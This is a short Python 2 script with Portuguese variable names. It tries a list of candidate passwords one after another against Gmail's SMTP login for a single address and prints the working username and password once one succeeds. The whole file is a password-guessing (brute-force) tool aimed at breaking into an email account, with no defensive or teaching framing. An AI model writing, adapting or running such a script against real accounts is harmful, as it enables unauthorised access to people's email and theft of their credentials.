import smtplib

login = "email@gmail.com"
senhas = ["senha1", "senha2", "senha3", "senha4"]

for senha in senhas:
    server = smtplib.SMTP('smtp.gmail.com', 587) #1
    server.starttls() #2
    try:
        server.login(login, senha) #3
    except smtplib.SMTPAuthenticationError:
        print "Erro ->", senha
    else: #4
        print "USER:", login
        print "PASS:", senha
        break
    finally:
        server.close()